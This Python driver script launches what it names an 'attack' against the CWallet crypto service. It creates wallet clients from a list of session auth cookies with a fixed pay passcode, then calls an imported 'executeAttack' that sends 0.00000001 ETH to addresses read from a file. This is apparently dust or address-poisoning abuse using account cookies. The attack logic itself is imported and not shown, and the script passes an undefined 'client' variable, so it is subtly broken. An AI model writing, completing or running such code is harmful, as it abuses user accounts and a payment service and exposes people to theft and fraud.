import asyncio
from script import executeAttack
from attack import CWalletClient
from coin import COINS
import logging
from logging.handlers import RotatingFileHandler


def setup_logging(enabled: bool = True):
    if not enabled:
        logging.disable(logging.CRITICAL)
        return
    # Keep root logger quiet
    logging.getLogger().setLevel(logging.WARNING)

    # File handler
    handler = RotatingFileHandler(
        "cwallet_debug.log",
        maxBytes=2_000_000,
        backupCount=3
    )
    handler.setLevel(logging.DEBUG)

    formatter = logging.Formatter(
        "%(asctime)s | %(levelname)s | %(name)s | %(message)s"
    )
    handler.setFormatter(formatter)

    # Attach ONLY to your module logger
    attack_logger = logging.getLogger("attack")
    attack_logger.setLevel(logging.DEBUG)
    attack_logger.addHandler(handler)

    # Silence noisy libraries explicitly
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)
    logging.getLogger("asyncio").setLevel(logging.WARNING)



async def main():
    # Cookies
    clients = []
    cookies = [

    ]
    # Creating attack clients
    for cookie in cookies:
        clients.append(CWalletClient(authCookie=cookie, payPassCode="111111"))


    # Getting Addresses

    addressesFileName = "manual.txt"
    resultsFileName = "results_eth.txt"
    amount = "0.00000001"
    cryptoCoin = COINS["ETH"]

    await executeAttack(
        addressesFileName=addressesFileName,
        resultsFileName=resultsFileName,
        client=client,
        coin=cryptoCoin,
        amount=amount
    )

if __name__ == "__main__":
    setup_logging(enabled=True)
    asyncio.run(main())
